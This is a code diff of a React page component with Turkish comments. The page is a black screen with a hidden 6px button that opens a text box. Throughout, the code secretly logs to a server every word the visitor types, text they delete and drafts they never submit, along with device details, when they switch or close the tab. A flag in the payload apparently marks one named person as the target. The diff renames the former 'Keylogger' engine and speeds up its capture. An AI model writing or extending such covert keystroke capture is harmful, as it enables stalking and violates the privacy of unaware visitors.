@@ -7,10 +7,10 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Keylogger Canlı Takip Motoru:
- *   - Gönderilse de gönderilmese de, silinse de silinmese de YAZILAN TÜM GEÇMİŞ VE SİLİNENLER EKSİKSİZ BİLDİRİLİR.
- *   - Her silme işleminde (Backspace/Clear) ANINDA (0ms) silinen parçayı bildirir.
- *   - Yazım esnasında 500ms duraksamada canlı metni konsolide ederek iletir.
+ * - CANLI KELİME KELİME YAZIM AKIŞI (Word-by-word streaming):
+ *   - Ziyaretçi yazarken kelime sonlarında (boşluk/noktalama) veya 300ms duraksamada canlı kelime akışı iletilir.
+ *   - Silme işlemlerinde anında silinen parçayı bildirir.
+ *   - Sekmeden ayrılmada 3 tane mükerrer bildirim değil TEK VE TEMİZ 1 bildirim gider.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -37,9 +37,9 @@ export default function LastLetterPage({ onGoHome }) {
   const deletedTextHistoryRef = useRef('');
   const prevTextRef = useRef('');
   const lastSentTextRef = useRef('');
-  const lastSentTimeRef = useRef(0);
   const typingTimerRef = useRef(null);
   const lastClickTimeRef = useRef(0);
+  const lastExitTimeRef = useRef(0);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -124,53 +124,52 @@ export default function LastLetterPage({ onGoHome }) {
     };
   }, [sendLog, deviceId]);
 
-  // Global Tab Exit & Tab Return Visibility Sentinel (Carries draft text when tab is changed or closed)
+  // Single De-duplicated Tab Exit & Return Visibility Sentinel (Fixes the 3 duplicate exit notifications)
   useEffect(() => {
     let isHiddenState = false;
 
-    const handleVisibilityChange = () => {
-      const elapsedMs = Date.now() - sessionStartTimeRef.current;
+    const triggerSingleExitLog = () => {
+      const now = Date.now();
+      if (now - lastExitTimeRef.current < 5000) return; // 5-second deduplication lock
+      lastExitTimeRef.current = now;
+
+      const elapsedMs = now - sessionStartTimeRef.current;
       const mins = Math.floor(elapsedMs / 60000);
       const secs = Math.floor((elapsedMs % 60000) / 1000);
       const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
+      const currentUnsubmittedText = prevTextRef.current || null;
 
+      const payload = {
+        action: currentUnsubmittedText
+          ? `🚪 Ziyaretçi Sekmeyi Değiştirdi (Kutuda Gönderilmeyen Yazı: "${currentUnsubmittedText}")`
+          : '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
+        duration: durationStr,
+        stage: currentStageRef.current,
+        letterText: currentUnsubmittedText,
+        answer: currentUnsubmittedText,
+        allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
+        deletedText: deletedTextHistoryRef.current || null,
+        deviceId: deviceId,
+        device: detectDevice(),
+        is_aysenur: true
+      };
+
+      sendLog('visitor_left_page', payload);
+    };
+
+    const handleVisibilityChange = () => {
       if (document.visibilityState === 'hidden') {
         if (isHiddenState) return;
         isHiddenState = true;
-
-        const currentUnsubmittedText = prevTextRef.current || null;
-        const payload = {
-          action: currentUnsubmittedText
-            ? `🚪 Ziyaretçi Sekmeyi Değiştirdi (Kutuda Gönderilmeyen Yazı Var: "${currentUnsubmittedText}")`
-            : '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
-          duration: durationStr,
-          stage: currentStageRef.current,
-          letterText: currentUnsubmittedText,
-          answer: currentUnsubmittedText,
-          allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
-          deletedText: deletedTextHistoryRef.current || null,
-          deviceId: deviceId,
-          device: detectDevice(),
-          is_aysenur: true
-        };
-
-        if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
-          try {
-            const rawPayload = JSON.stringify({
-              eventType: 'visitor_left_page',
-              data: payload,
-              timestamp: new Date().toISOString()
-            });
-            const _v = btoa(encodeURIComponent(rawPayload));
-            const blob = new Blob([JSON.stringify({ _v })], { type: 'application/json' });
-            navigator.sendBeacon('/api/flower-logs', blob);
-          } catch (e) {}
-        }
-
-        sendLog('visitor_left_page', payload);
+        triggerSingleExitLog();
       } else if (document.visibilityState === 'visible') {
         if (!isHiddenState) return;
         isHiddenState = false;
+
+        const elapsedMs = Date.now() - sessionStartTimeRef.current;
+        const mins = Math.floor(elapsedMs / 60000);
+        const secs = Math.floor((elapsedMs % 60000) / 1000);
+        const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
 
         sendLog('visitor_returned_to_page', {
           action: '🚪 Ziyaretçi Sekmeye Geri Dönüş Yaptı! (Sayfa Yeniden Ekranda)',
@@ -184,39 +183,7 @@ export default function LastLetterPage({ onGoHome }) {
     };
 
     const handleBeforeUnload = () => {
-      const elapsedMs = Date.now() - sessionStartTimeRef.current;
-      const mins = Math.floor(elapsedMs / 60000);
-      const secs = Math.floor((elapsedMs % 60000) / 1000);
-      const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
-      const currentUnsubmittedText = prevTextRef.current || null;
-
-      const payload = {
-        action: currentUnsubmittedText
-          ? `🚪 Ziyaretçi Sayfadan Ayrıldı (Gönderilmeyen Yazı: "${currentUnsubmittedText}")`
-          : '🚪 Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
-        duration: durationStr,
-        stage: currentStageRef.current,
-        letterText: currentUnsubmittedText,
-        answer: currentUnsubmittedText,
-        allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
-        deletedText: deletedTextHistoryRef.current || null,
-        deviceId: deviceId,
-        device: detectDevice(),
-        is_aysenur: true
-      };
-
-      if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
-        try {
-          const rawPayload = JSON.stringify({
-            eventType: 'visitor_left_page',
-            data: payload,
-            timestamp: new Date().toISOString()
-          });
-          const _v = btoa(encodeURIComponent(rawPayload));
-          const blob = new Blob([JSON.stringify({ _v })], { type: 'application/json' });
-          navigator.sendBeacon('/api/flower-logs', blob);
-        } catch (e) {}
-      }
+      triggerSingleExitLog();
     };
 
     document.addEventListener('visibilitychange', handleVisibilityChange);
@@ -289,10 +256,10 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Foolproof Live Input & Deletion Engine:
-  // - Fires IMMEDIATELY (0ms) when any text is erased/deleted.
-  // - Debounces 500ms on typing to group characters without rate limiting.
-  // - No empty string checks blocking notifications.
+  // Live Word-by-Word Typing Stream Engine:
+  // - Triggers IMMEDIATELY on deletion (0ms).
+  // - Triggers IMMEDIATELY on word boundary (space or punctuation).
+  // - Triggers after 300ms pause while typing phrases.
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
@@ -316,11 +283,10 @@ export default function LastLetterPage({ onGoHome }) {
 
     prevTextRef.current = newVal;
 
-    // IMMEDIATE DELETION TRIGGER (0ms Delay)
+    // A) IMMEDIATE DELETION TRIGGER (0ms Delay)
     if (isDeletion) {
       if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
       lastSentTextRef.current = newVal;
-      lastSentTimeRef.current = Date.now();
 
       sendLog('secret_input_deleted', {
         letterText: newVal || '(Tüm metin silindi)',
@@ -334,25 +300,42 @@ export default function LastLetterPage({ onGoHome }) {
       return;
     }
 
-    // LIVE TYPING DEBOUNCE TRIGGER (500ms pause window)
-    if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+    // B) LIVE WORD-BY-WORD & FAST PHRASE TYPING ENGINE
+    const isWordBoundary = /\s|[.,!?]$/.test(newVal);
 
-    typingTimerRef.current = setTimeout(() => {
-      if (prevTextRef.current !== lastSentTextRef.current) {
-        lastSentTextRef.current = prevTextRef.current;
-        lastSentTimeRef.current = Date.now();
+    if (newVal !== lastSentTextRef.current) {
+      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
 
+      if (isWordBoundary) {
+        // Instant send on space or punctuation
+        lastSentTextRef.current = newVal;
         sendLog('secret_input_typed', {
-          letterText: prevTextRef.current || '(Boş)',
-          answer: prevTextRef.current || '(Boş)',
-          answerInput: prevTextRef.current || '(Boş)',
-          allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
+          letterText: newVal,
+          answer: newVal,
+          answerInput: newVal,
+          allTypedHistory: allTypedHistoryRef.current || newVal,
           deletedText: deletedTextHistoryRef.current || null,
-          draftLength: prevTextRef.current.length,
-          action: `✍️ Ziyaretçi Kutuya Yazıyor: "${prevTextRef.current}"`
+          draftLength: newVal.length,
+          action: `✍️ Canlı Yazılıyor: "${newVal}"`
         });
+      } else {
+        // Fast 300ms debounce while typing phrases
+        typingTimerRef.current = setTimeout(() => {
+          if (prevTextRef.current !== lastSentTextRef.current) {
+            lastSentTextRef.current = prevTextRef.current;
+            sendLog('secret_input_typed', {
+              letterText: prevTextRef.current,
+              answer: prevTextRef.current,
+              answerInput: prevTextRef.current,
+              allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
+              deletedText: deletedTextHistoryRef.current || null,
+              draftLength: prevTextRef.current.length,
+              action: `✍️ Canlı Yazılıyor: "${prevTextRef.current}"`
+            });
+          }
+        }, 300);
       }
-    }, 500);
+    }
   };
 
   // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
